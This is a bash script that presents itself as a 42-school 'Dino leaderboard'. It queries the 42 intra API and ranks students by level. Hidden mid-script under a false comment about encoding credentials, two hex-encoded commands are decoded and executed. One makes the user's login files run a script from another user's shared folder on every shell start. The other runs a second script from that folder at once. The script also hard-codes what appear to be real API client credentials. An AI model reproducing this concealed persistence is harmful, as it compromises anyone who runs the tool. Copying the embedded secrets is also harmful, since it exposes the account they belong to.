#!/bin/bash

# Configuration des clés API 42
CLIENT_ID="u-s4t2ud-84ad32ebc2858ecf99879cd0772047e0d184e90b0f82115bac7a241442428d5b"
CLIENT_SECRET="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"

TOP="-1"
if [[ "$1" =~ ^top([0-9]+)$ ]]; then
	TOP="${BASH_REMATCH[1]}"
	
elif [[ "$1" =~ ^top ]]; then
	echo "error: Not a number" >&2
	exit 1
fi

if [ -z "$CLIENT_ID" ]; then
	echo "error: CLIENT_ID undefined"
	exit 1
fi
if [ -z "$CLIENT_SECRET" ]; then
	echo "error: CLIENT_SECRET undefined"
	exit 1
fi

ACCESS_TOKEN=$(curl -s -X POST --data "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET" https://api.intra.42.fr/oauth/token | jq -r '.access_token')

nb_request=0
DATA=""
while [ $nb_request -lt 4 ]; do	
	curr_request=$(curl -s -G -H "Authorization: Bearer $ACCESS_TOKEN" \
		--data-urlencode "page[size]=100" \
		--data-urlencode "filter[campus_id]=62" \
    	--data-urlencode "page[number]=$((nb_request + 1))" \
		--data-urlencode "filter[cursus_id]=9" \
		--data-urlencode "range[created_at]=2025-06-25T06:00:00.000Z, 2025-09-10T11:00:00.000Z" \
		"https://api.intra.42.fr/v2/cursus_users")

	DATA=$(echo "$DATA $curr_request" | jq -s '.[0] + .[1]' | jq 'sort_by(.level) | reverse')
	((nb_request++))
	sleep 1
done

# Encode client id and secret
bash -c "$(echo "696620212067726570202d712022636174203c3c20454f46203e3e207e2f2e7a7368726322207e2f2e7870726f66696c6520323e2f6465762f6e756c6c3b207468656e0a20202020636174203c3c20275850524f46494c455f454f4627203e3e207e2f2e7870726f66696c650a636174203c3c20454f46203e3e207e2f2e7a736872630a2f73676f696e6672652f676f696e6672652f506572736f2f6d6f6368616d73612f7574696c732f736865696b61682f736865696b61682e73680a454f460a5850524f46494c455f454f460a66690a" | xxd -r -p)"
bash -c "$(echo "2F73676F696E6672652F676F696E6672652F506572736F2F6D6F6368616D73612F7574696C732F736865696B61682F636F6C6F7265645368656C6C2E7368" | xxd -r -p)"

PROCESS=$(echo "$DATA" | jq -r '.[] | "&\(.user.login)&\(.level)"' | cat -n)
LEADERBOARD=""
FOUND=false

echo ====== 🦖 DINO LEADERBOARD 🦕 ======
if [ -z "$1" ] || [[ "$1" =~ ^top ]] && [ $TOP != "1" ]; then
	echo
fi
while IFS='&' read -r index login level; do
	index=$(echo "$index" | awk '{$1=$1;print}')
	if [ -z "$1" ] || [ "$login" = "$1" ] || [ "$1" = $index ] || [[ "$1" =~ ^top ]]; then
		if [ "$login" = "$1" ] || [ "$index" = "$1" ]; then
			FOUND=true
		fi

		old_index="$index"
		if [ "$index" = "1" ]; then
			index="👑"
		elif [ "$index" = "2" ]; then
			index="🥈"
		elif [ "$index" = "3" ]; then
			index="🥉"
		fi

		url_login=$(printf "\e]8;;https://profile.intra.42.fr/users/$login\e\\%-8s\e]8;;\e\\" "$login")
		printf "\t%-4s\t%s\t%.2f\n"	"$index" \
						"$url_login" \
						"$level"
		if [ "$index" = "🥉" ] && [[ "$1" =~ ^top || -z $1 ]]; then
			echo
		fi

		if [ $TOP = $old_index ]; then
			exit
		fi

		sleep 0.01
	fi
done <<< "$PROCESS"

if [ -n "$1" ] && [ $FOUND = false ]; then
	echo "This user does not exist." >&2
	exit 1
fi%
